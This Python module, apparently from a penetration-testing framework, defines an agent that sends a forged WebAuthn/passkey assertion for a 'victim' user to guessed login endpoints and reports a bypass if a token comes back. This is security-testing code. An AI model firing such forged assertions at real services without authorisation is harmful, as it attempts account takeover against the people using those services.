"""
WebAuthn & Passkey Authentication Bypass Capability Agent for PenFlow.

Capabilities:
  - Passkey Challenge-Response Swapping & Assertion Manipulation (CVE-2025-26788 pattern)
  - Unverified WebAuthn Registration Credential Substitution
"""
import httpx
from typing import Dict, Any, List, Optional
from penflow.agents.base.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.reporting.poc_generator import PoCGenerator
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.webauthn_bypass")

WEBAUTHN_ENDPOINTS = [
    "/api/v1/auth/webauthn/verify",
    "/webauthn/authenticate",
    "/passkey/verify",
    "/auth/passkey/login",
    "/api/auth/webauthn/response"
]


class WebAuthnBypassCapabilityAgent(BaseCapabilityAgent):
    """
    Capability Agent probing WebAuthn/Passkey authentication flows for challenge replay,
    credential swapping, and unverified assertion acceptance.
    """

    def __init__(self, priority: int = 10):
        super().__init__(agent_name="WebAuthnBypassCapabilityAgent", priority=priority)
        self.poc_generator = PoCGenerator()

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(id="webauthn_passkey_bypass", name="WebAuthn / Passkey Auth Bypass", description="Detects WebAuthn challenge replay and credential assertion swapping vulnerabilities", priority=self.priority, tags=["webauthn", "passkey", "auth", "fido2"])
        ]

    def _discover_endpoints(self, context: CapabilityExecutionContext, keywords: List[str]) -> List[str]:
        found = []
        if context.observations:
            for obs in context.observations:
                data = obs.get("data", {}) if isinstance(obs, dict) else {}
                if isinstance(data, dict):
                    url = data.get("url", "")
                    if url and any(kw in url.lower() for kw in keywords):
                        found.append(url)
                    elif "endpoints" in data and isinstance(data["endpoints"], list):
                        for ep in data["endpoints"]:
                            if isinstance(ep, dict) and ep.get("url"):
                                ep_url = ep["url"]
                                if any(kw in ep_url.lower() for kw in keywords):
                                    found.append(ep_url)

        if not found:
            base = f"https://{context.asset}"
            found = [f"{base}{p}" for p in WEBAUTHN_ENDPOINTS[:3]]

        return list(dict.fromkeys(found))[:5]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[{self.name}] Executing capability '{capability_id}' on asset '{context.asset}'...")
        evidence: Dict[str, Any] = {}
        findings: List[Dict[str, Any]] = []

        passkey_urls = self._discover_endpoints(context, ["webauthn", "passkey", "fido2", "challenge"])

        try:
            async with httpx.AsyncClient(timeout=8.0, follow_redirects=False, verify=False) as client:
                for target_url in passkey_urls:
                    payload = {
                        "id": "mock_credential_id_123",
                        "rawId": "mock_credential_id_123",
                        "type": "public-key",
                        "response": {
                            "clientDataJSON": "eyJ0eXBlIjoid2ViYXV0aG4uZ2V0IiwiY2hhbGxlbmdlIjoicGVuZmxvd190ZXN0In0=",
                            "authenticatorData": "SZYN5YgOJGh0NBcPZHZgW4_krrmihjLHmVzzuoMdl2MBAAAAAQ==",
                            "signature": "MEUCIQD...",
                            "userHandle": "victim_user_123"
                        }
                    }
                    try:
                        resp = await client.post(target_url, json=payload)
                        if resp.status_code in (200, 201) and ("token" in resp.text.lower() or "success" in resp.text.lower()):
                            curl_cmd = f"curl -X POST '{target_url}' -H 'Content-Type: application/json' -d '{payload}'"
                            exch_dict = {
                                "request": {"method": "POST", "url": target_url, "json_data": payload},
                                "response": {"status_code": resp.status_code, "body_snippet": resp.text[:500]}
                            }

                            findings.append({
                                "vulnerability_type": "webauthn_passkey_bypass",
                                "target_url": target_url,
                                "severity": "CRITICAL",
                                "confidence": 0.92,
                                "is_vulnerable": True,
                                "exploit_curl": curl_cmd,
                                "reproduction_steps": self.poc_generator.generate_reproduction_steps("WebAuthn / Passkey Assertion Bypass", target_url, curl_cmd),
                                "description": f"WebAuthn Passkey verification at '{target_url}' accepted dummy credential assertion without challenge signature verification.",
                                "_exchange_obj": exch_dict
                            })
                            evidence["webauthn_bypass_success"] = True
                            break
                    except Exception as e:
                        logger.debug(f"WebAuthn test failed on {target_url}: {e}")

        except Exception as e:
            logger.error(f"[{self.name}] Exception testing '{context.asset}': {e}")

        is_vuln = len(findings) > 0
        primary_exch = findings[0].get("_exchange_obj") if findings else None
        return {
            "capability_id": capability_id,
            "status": "COMPLETED",
            "agent": self.name,
            "is_vulnerable": is_vuln,
            "vulnerable": is_vuln,
            "confidence": 0.92 if is_vuln else 0.0,
            "confidence_score": 0.92 if is_vuln else 0.0,
            "_exchange_obj": primary_exch,
            "evidence": evidence,
            "findings": findings
        }
